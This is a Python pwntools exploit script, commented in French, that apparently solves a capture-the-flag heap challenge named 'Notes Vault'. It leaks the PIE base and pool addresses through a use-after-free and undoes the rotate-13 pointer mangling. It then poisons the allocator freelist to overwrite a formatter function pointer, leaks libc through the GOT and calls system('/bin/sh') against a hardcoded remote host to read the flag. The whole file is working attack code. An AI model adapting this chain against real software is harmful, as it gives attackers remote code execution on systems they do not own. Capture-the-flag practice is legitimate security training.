#!/usr/bin/env python3
# PWN003 - "Notes Vault" : allocateur custom (safe-linking rol13) + UAF.
# Chaine : fuite PIE gratuite -> fuite pool (UAF+view) -> freelist poisoning
# -> alloc d'un buffer SUR notes_storage -> controle du pointeur formatter
# -> fuite libc (default_formatter = write brut) -> system("/bin/sh").
import sys, json, urllib.request
from pwn import *

context.binary = elf = ELF('./notes', checksec=False)
context.log_level = 'info'
REMOTE = '--remote' in sys.argv
HOST, PORT = '169.58.126.107', 5002

MASK = (1 << 64) - 1
rol = lambda x, r=13: ((x << r) | (x >> (64 - r))) & MASK
ror = lambda x, r=13: ((x >> r) | (x << (64 - r))) & MASK

io = remote(HOST, PORT) if REMOTE else process(elf.path)

# 0) fuite PIE : main() affiche "[debug] build id: %p" = &main (offset 0x1af8)
io.recvuntil(b'build id: ')
elf.address = int(io.recvline().strip(), 16) - 0x1af8
log.success(f'PIE base = {hex(elf.address)}')

def menu(c):  io.sendlineafter(b'> ', str(c).encode())
def add(i, sz, data):
    menu(1); io.sendlineafter(b'Index (0-7): ', str(i).encode())
    io.sendlineafter(b'Size: ', str(sz).encode())
    io.sendafter(b'Content: ', data.ljust(sz, b'\x00')[:sz]); io.recvuntil(b'Added.')
def free(i): menu(2); io.sendlineafter(b'Index: ', str(i).encode()); io.recvuntil(b'Freed.')
def edit(i, data): menu(3); io.sendlineafter(b'Index: ', str(i).encode()); io.sendafter(b'Content: ', data)
def view(i): menu(4); io.sendlineafter(b'Index: ', str(i).encode())

# 1) notes classe 0 (size<=0x20) : victime (0) + chunk a poisonner (1)
add(0, 0x18, b'victim')
add(1, 0x18, b'poison')

# 2) UAF : free(1) -> *X = rol(X,13) ; view(1) fuit -> X (adresse pool/heap)
free(1); view(1); io.recvuntil(b'Note: ')
X = ror(u64(io.recvn(0x20)[:8]))
log.success(f'pool chunk X = {hex(X)}')

# 3) freelist poisoning : on force la 2e alloc a renvoyer notes_storage
T = elf.sym.notes_storage
edit(1, p64(T ^ rol(X)))          # *X = T ^ rol(X,13)  -> apres demangle : T
add(4, 0x18, b'A')                # pop X, freelist[0] = T
add(2, 0x18, p64(0) * 3)          # pop T : la note 2 (ctrl) a content = notes_storage

# 4) notes_storage[0] = meta de la note 0 ; en editant ctrl on la reecrit a volonte.
#    Fuite libc via default_formatter (write(1,content,0x20) = 32 octets bruts, pas de troncature)
def leak_got(sym):
    edit(2, p64(elf.sym.default_formatter) + p64(elf.got[sym]) + p64(0x20))
    view(0); io.recvuntil(b'Note: ')
    return u64(io.recvn(0x20)[:8])

leaks = {s: leak_got(s) for s in ('puts', 'read', 'printf')}
for s, v in leaks.items(): log.info(f'{s} = {hex(v)}')
leak = leaks['puts']

# 5) resolution libc
if REMOTE:
    req = urllib.request.Request('https://libc.rip/api/find',
        data=json.dumps({'symbols': {s: hex(v & 0xfff) for s, v in leaks.items()}}).encode(),
        headers={'Content-Type': 'application/json'})
    m = json.load(urllib.request.urlopen(req, timeout=15))[0]
    base = leak - int(m['symbols']['puts'], 16)
    system = base + int(m['symbols']['system'], 16)
    binsh = base + int(m['symbols']['str_bin_sh'], 16)
    log.success(f'libc = {m["id"]}  base = {hex(base)}')
else:
    libc = ELF(io.libc.path, checksec=False)
    libc.address = leak - libc.sym.puts
    system = libc.sym.system
    binsh = next(libc.search(b'/bin/sh'))

# 6) formatter=system, content=&/bin/sh ; view(0) -> system("/bin/sh")
edit(2, p64(system) + p64(binsh) + p64(0))
view(0)
io.sendline(b'cat /flag/flag.txt /flag* 2>/dev/null')
io.interactive()
